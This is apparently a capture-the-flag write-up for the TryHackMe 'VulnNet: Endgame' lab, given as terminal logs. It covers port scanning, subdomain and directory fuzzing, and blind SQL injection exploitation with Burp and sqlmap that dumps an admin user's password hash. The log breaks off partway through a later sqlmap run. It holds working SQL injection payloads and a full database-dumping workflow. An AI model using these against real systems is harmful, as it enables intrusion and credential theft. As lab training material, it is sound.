----
Hack your way into this simulated vulnerable infrastructure. No puzzles. Enumeration is the key.
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/5ec42470043801a381211912be05cfa6.png)

![](https://images.unsplash.com/photo-1489389944381-3471b5b30f04?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1170&q=80)

### VulnNet: Endgame

 Start Machine

 VulnNet series is back with a new challenge.

 It's the final challenge in this series, compromise the system. Enumeration is the key.

  

  Deploy the vulnerable machine by clicking the "Start Machine" button. Access the system at [http://10.10.246.2](http://10.10.246.2/) and [http://vulnnet.thm](http://vulnnet.thm/) domain. Answer the task questions to complete the challenge.


Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.246.2 vulnnet.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.246.2 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.246.2:22
Open 10.10.246.2:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 13:13 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
Initiating Connect Scan at 13:14
Scanning vulnnet.thm (10.10.246.2) [2 ports]
Discovered open port 80/tcp on 10.10.246.2
Discovered open port 22/tcp on 10.10.246.2
Completed Connect Scan at 13:14, 0.20s elapsed (2 total ports)
Initiating Service scan at 13:14
Scanning 2 services on vulnnet.thm (10.10.246.2)
Completed Service scan at 13:14, 6.41s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.246.2.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 10.15s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 1.23s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
Nmap scan report for vulnnet.thm (10.10.246.2)
Host is up, received user-set (0.20s latency).
Scanned at 2023-04-21 13:14:00 EDT for 18s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb2ee6cc79f47d682c11bc4b631908af (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6xhSTxgS3q6xVmL6UU3hIbpiXzYcj2vxuAXXszyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x
|   256 8061bf8caad14d4468154533edeb82a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=
|   256 878604e9e0c0602aab878e9bc705351c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:14
Completed NSE at 13:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.53 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u vulnnet.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.vulnnet.thm" --hc 404 --hw 9
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://vulnnet.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload  
=====================================================================

000000018:   200        390 L    1599 W     19316 Ch    "blog"   
000000037:   200        524 L    1406 W     26701 Ch    "shop"   
000000051:   200        0 L      4 W        18 Ch       "api"    
000000689:   400        10 L     35 W       301 Ch      "gc._msdc
                                                        s"       
000001219:   307        0 L      0 W        0 Ch        "admin1" 

4 subdomains found (add to /etc/hosts)

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts      
10.10.246.2 vulnnet.thm blog.vulnnet.thm shop.vulnnet.thm api.vulnnet.thm admin1.vulnnet.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://admin1.vulnnet.thm/ -i200,301,302,401 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/admin1.vulnnet.thm/-_23-04-21_13-39-54.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-04-21_13-39-54.log

Target: http://admin1.vulnnet.thm/

[13:39:54] Starting: 
[13:40:19] 301 -  321B  - /en  ->  http://admin1.vulnnet.thm/en/
[13:40:23] 301 -  328B  - /fileadmin  ->  http://admin1.vulnnet.thm/fileadmin/
[13:41:09] 301 -  328B  - /typo3temp  ->  http://admin1.vulnnet.thm/typo3temp/
[13:41:09] 301 -  328B  - /typo3conf  ->  http://admin1.vulnnet.thm/typo3conf/
[13:41:09] 301 -  324B  - /typo3  ->  http://admin1.vulnnet.thm/typo3/
[13:41:11] 301 -  325B  - /vendor  ->  http://admin1.vulnnet.thm/vendor/

Task Completed

Login page (http://admin1.vulnnet.thm/typo3/)

http://blog.vulnnet.thm/post5.php

getJSON('http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5',  function(err, data) {

    if (err != null) {
        console.error(err);
    } else {
    	//unfinished
    	//move to js assets
        console.log(text);
    }
});

Boolean-based blind sqli 

using burp

GET /vn_internals/api/v2/fetch/?blog=5+AND+1337%3d1337--+- HTTP/1.1
Host: api.vulnnet.thm

Response:
HTTP/1.1 200 OK
Date: Fri, 21 Apr 2023 17:53:36 GMT
Server: Apache/2.4.29 (Ubuntu)
Access-Control-Allow-Origin: *
Content-Length: 136
Connection: close
Content-Type: application/json
{"request_id":"5 AND 1337=1337-- -","blog_id":"5","titles":"18 Things You Should Learn Before Moving Into a New Home","status":"draft"}

let's use sqlmap

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:56:36 /2023-04-21/

[13:56:37] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[13:56:38] [INFO] testing connection to the target URL
[13:56:39] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:56:40] [INFO] testing if the target URL content is stable
[13:56:40] [INFO] target URL content is stable
[13:56:40] [INFO] testing if GET parameter 'blog' is dynamic
[13:56:41] [INFO] GET parameter 'blog' appears to be dynamic
[13:56:41] [WARNING] reflective value(s) found and filtering out
[13:56:41] [INFO] heuristic (basic) test shows that GET parameter 'blog' might be injectable
[13:56:42] [INFO] testing for SQL injection on GET parameter 'blog'
[13:56:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:56:44] [INFO] GET parameter 'blog' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[13:56:54] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:56:54] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:56:55] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:56:55] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:56:55] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:56:56] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:56:56] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:56:56] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:56:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:56:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:56:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:56:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:56:58] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:56:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:56:59] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:56:59] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:57:00] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:57:00] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:57:01] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:57:01] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:57:02] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:57:02] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[13:57:02] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:57:03] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:57:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:57:04] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:57:04] [INFO] testing 'Generic inline queries'
[13:57:05] [INFO] testing 'MySQL inline queries'
[13:57:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:57:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:57:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:57:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:57:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:57:07] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:57:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:57:19] [INFO] GET parameter 'blog' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:57:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:57:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:57:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:57:23] [INFO] target URL appears to have 3 columns in query
[13:57:25] [INFO] GET parameter 'blog' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'blog' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[13:57:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[13:57:28] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[13:57:28] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 13:57:28 /2023-04-21/

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D vn_admin --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:58:12 /2023-04-21/

[13:58:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[13:58:12] [INFO] resuming back-end DBMS 'mysql' 
[13:58:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[13:58:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[13:58:13] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[13:58:13] [INFO] fetching tables for database: 'vn_admin'
[13:58:13] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
| pages                                       |
| sys_be_shortcuts                            |
| sys_category                                |
| sys_category_record_mm                      |
| sys_collection                              |
| sys_collection_entries                      |
| sys_file                                    |
| sys_file_collection                         |
| sys_file_metadata                           |
| sys_file_processedfile                      |
| sys_file_reference                          |
| sys_file_storage                            |
| sys_filemounts                              |
| sys_history                                 |
| sys_language                                |
| sys_lockedrecords                           |
| sys_log                                     |
| sys_news                                    |
| sys_note                                    |
| sys_redirect                                |
| sys_refindex                                |
| sys_registry                                |
| sys_template                                |
| tt_content                                  |
| tx_extensionmanager_domain_model_extension  |
| tx_extensionmanager_domain_model_repository |
| tx_impexp_presets                           |
+---------------------------------------------+

[13:58:13] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 13:58:13 /2023-04-21/

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D vn_admin -T be_users --columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:01:34 /2023-04-21/

[14:01:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.0; fr-FR; rv:1.7.7) Gecko/20050414 Firefox/1.0.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:01:35] [INFO] resuming back-end DBMS 'mysql' 
[14:01:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[14:01:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[14:01:36] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[14:01:36] [INFO] fetching columns for table 'be_users' in database 'vn_admin'
[14:01:36] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
Table: be_users
[34 columns]
+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
| allowed_languages     | varchar(255)         |
| avatar                | int(10) unsigned     |
| category_perms        | text                 |
| crdate                | int(10) unsigned     |
| createdByAction       | int(11)              |
| cruser_id             | int(10) unsigned     |
| db_mountpoints        | text                 |
| deleted               | smallint(5) unsigned |
| description           | text                 |
| disable               | smallint(5) unsigned |
| disableIPlock         | smallint(5) unsigned |
| email                 | varchar(255)         |
| endtime               | int(10) unsigned     |
| file_mountpoints      | text                 |
| file_permissions      | text                 |
| lang                  | varchar(6)           |
| lastlogin             | int(10) unsigned     |
| lockToDomain          | varchar(50)          |
| options               | smallint(5) unsigned |
| password              | varchar(100)         |
| pid                   | int(10) unsigned     |
| realName              | varchar(80)          |
| starttime             | int(10) unsigned     |
| TSconfig              | text                 |
| tstamp                | int(10) unsigned     |
| uc                    | mediumblob           |
| uid                   | int(10) unsigned     |
| usergroup             | varchar(255)         |
| usergroup_cached_list | text                 |
| userMods              | text                 |
| username              | varchar(50)          |
| workspace_id          | int(11)              |
| workspace_perms       | smallint(6)          |
+-----------------------+----------------------+

[14:01:36] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 14:01:36 /2023-04-21/

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D vn_admin -T be_users -C admin,email,username,password --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:12:05 /2023-04-21/

[14:12:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:12:06] [INFO] resuming back-end DBMS 'mysql' 
[14:12:06] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[14:12:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[14:12:07] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[14:12:07] [INFO] fetching entries of column(s) 'admin,email,password,username' for table 'be_users' in database 'vn_admin'
[14:12:07] [WARNING] reflective value(s) found and filtering out
Database: vn_admin
Table: be_users
[1 entry]
+-------+---------------------+----------+---------------------------------------------------------------------------------------------------+
| admin | email               | username | password                                                                                          |
+-------+---------------------+----------+---------------------------------------------------------------------------------------------------+
| 1     | chris_w@vulnnet.thm | chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
+-------+---------------------+----------+---------------------------------------------------------------------------------------------------+

[14:12:07] [INFO] table 'vn_admin.be_users' dumped to CSV file '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm/dump/vn_admin/be_users.csv'
[14:12:07] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 14:12:07 /2023-04-21/

┌──(witty㉿kali)-[~/Downloads]
└─$ cat vulnnet_hash
$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg

let's see the others tables

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D blog --tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:21:30 /2023-04-21/

[14:21:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; cs-CZ; rv:1.9.0.4) Gecko/2008111318 Ubuntu/8.04 (hardy) Firefox/3.0.4' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:21:31] [INFO] resuming back-end DBMS 'mysql' 
[14:21:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[14:21:32] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[14:21:32] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[14:21:32] [INFO] fetching tables for database: 'blog'
[14:21:32] [WARNING] reflective value(s) found and filtering out
Database: blog
[4 tables]
+------------+
| blog_posts |
| details    |
| metadata   |
| users      |
+------------+

[14:21:32] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 14:21:32 /2023-04-21/

                                                                                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D blog -T users --columns
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:21:53 /2023-04-21/

[14:21:53] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.3) Gecko/2008092510 Ubuntu/8.04 (hardy) Firefox/3.0.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:21:53] [INFO] resuming back-end DBMS 'mysql' 
[14:21:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[14:21:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
